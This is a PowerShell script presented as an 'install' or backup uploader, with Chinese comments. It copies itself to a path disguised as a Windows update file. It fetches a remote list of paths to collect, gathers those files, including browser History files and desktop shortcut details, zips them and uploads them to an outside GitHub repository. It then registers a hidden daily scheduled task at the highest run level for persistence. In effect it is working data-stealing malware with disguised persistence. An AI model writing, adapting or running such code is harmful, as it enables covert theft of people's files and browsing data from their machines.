# install.ps1 - 上传文件 + 注册计划任务（带日志 + 出错暂停）
$logPath = "C:\upload_log.txt"
function Log($msg) {
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    $line | Out-File $logPath -Append
    Write-Host $line
}
Log "===== INSTALL EXECUTED ====="

# 下载自身副本
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
$remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"

try {
    Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
    Log "✔ install.ps1 downloaded to $localPath"
} catch {
    Log "❌ Failed to download install.ps1: $($_.Exception.Message)"
    Pause
    return
}

# 获取 GitHub Token
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Log "❌ GITHUB_TOKEN 环境变量不存在，终止执行"
    Pause
    return
}

# 上传逻辑
try {
    $repo = "drftghy/backup-files"
    $now = Get-Date
    $timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
    $date = $now.ToString("yyyy-MM-dd")
    $computerName = $env:COMPUTERNAME
    $tag = "backup-$computerName-$timestamp"
    $releaseName = "Backup - $computerName - $date"
    $tempRoot = "$env:TEMP\package-$computerName-$timestamp"
    $zipName = "package-$computerName-$timestamp.zip"
    $zipPath = Join-Path $env:TEMP $zipName
    New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null

    # 加载上传路径
    $targetListUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
    $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing
    $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }

    # 拷贝目标文件
    $i = 0
    foreach ($path in $paths) {
        $i++
        $dst = Join-Path $tempRoot "item$i"
        try {
            if (-not (Test-Path $path)) { continue }
            if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
                robocopy (Split-Path $path) $dst (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            } elseif (Test-Path $path -PathType Container) {
                Copy-Item $path -Destination $dst -Recurse -Force
            } else {
                Copy-Item $path -Destination $dst -Force
            }
        } catch {
            Log "⚠ Failed to copy path: $path => $($_.Exception.Message)"
        }
    }

    # 提取桌面快捷方式
    try {
        $desktop = [Environment]::GetFolderPath("Desktop")
        $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
        $lnkReport = ""
        foreach ($lnk in $lnkFiles) {
            $shell = New-Object -ComObject WScript.Shell
            $s = $shell.CreateShortcut($lnk.FullName)
            $lnkReport += "[$($lnk.Name)]`nTarget: $($s.TargetPath)`nArgs: $($s.Arguments)`nStartIn: $($s.WorkingDirectory)`nIcon: $($s.IconLocation)`n---`n"
        }
        $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
    } catch {
        Log "⚠ Failed to extract shortcut info: $($_.Exception.Message)"
    }

    # 压缩
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
    Log "✔ Archive created: $zipPath"

    # 创建 Release
    $releaseData = @{
        tag_name    = $tag
        name        = $releaseName
        body        = "Auto backup from $computerName"
        draft       = $false
        prerelease  = $false
    } | ConvertTo-Json -Depth 3

    $headers = @{
        Authorization = "token $token"
        "User-Agent"  = "PowerShell"
        Accept        = "application/vnd.github.v3+json"
    }

    $releaseResp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
    $uploadUrl = $releaseResp.upload_url -replace "{.*}", "?name=$zipName"

    # 上传压缩包
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShell"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes

    Log "✅ Upload completed."
} catch {
    Log "❌ Upload failed: $($_.Exception.Message)"
    Pause
    return
}

# 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# 注册计划任务（当前用户）
try {
    $taskName = "UploaderTask"
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        Log "✔ Existing task removed"
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
    Log "✅ Scheduled task registered at 0:00"
} catch {
    Log "❌ Failed to register task: $($_.Exception.Message)"
    Pause
    return
}
